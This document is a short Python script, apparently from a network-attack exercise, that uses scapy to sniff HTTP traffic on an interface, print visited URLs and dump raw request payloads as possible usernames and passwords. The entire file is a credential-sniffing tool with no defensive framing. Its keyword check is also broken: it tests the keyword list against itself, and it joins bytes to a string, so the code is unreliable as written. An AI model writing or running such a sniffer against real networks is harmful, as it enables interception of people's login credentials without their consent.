#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processed_sniffed_packets)

def get_url(packet):
    return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

def processed_sniffed_packets(packet):
    OKGREEN = '\033[92m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(OKGREEN +"[+] HTTP Request: "+url)
        login_info = get_login_info(packet)
        if login_info:
            print(OKBLUE + "[+] Possible username/password: " + login_info)

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords_list = ["username", "password", "user", "pass", "u", "p", "login", "uname"]
        for keyword in keywords_list:
            if keyword in keywords_list:
                return load




sniff("eth0")